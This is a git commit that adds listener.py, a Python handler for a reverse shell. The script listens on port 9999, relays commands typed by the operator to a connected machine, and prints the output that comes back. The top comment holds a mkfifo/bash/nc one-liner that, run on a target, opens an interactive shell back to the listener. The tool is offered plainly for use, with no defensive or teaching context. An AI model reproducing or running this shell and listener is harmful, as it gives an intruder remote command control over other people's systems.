3411f5d2cc2605975c668f69afd40032e23652bc
JasBs <fifoboss007@gmail.com>
2023-09-28 22:46:38 +0200

    1st

---
+++ listener.py
@@ -0,0 +1,23 @@
+# mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 9999 >/tmp/f
+
+import socket, sys, time
+
+def listen(ip,port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((ip, port))
+    s.listen(1)
+    print("Listening on port " + str(port))
+    conn, addr = s.accept()
+    print('Connection received from ',addr)
+    while True:
+        ans = conn.recv(1024).decode()
+        sys.stdout.write(ans)
+        command = input()
+
+        command += "\n"
+        conn.send(command.encode())
+        time.sleep(1)
+
+        sys.stdout.write("\033[A" + ans.split("\n")[-1])
+
+listen("0.0.0.0",9999)
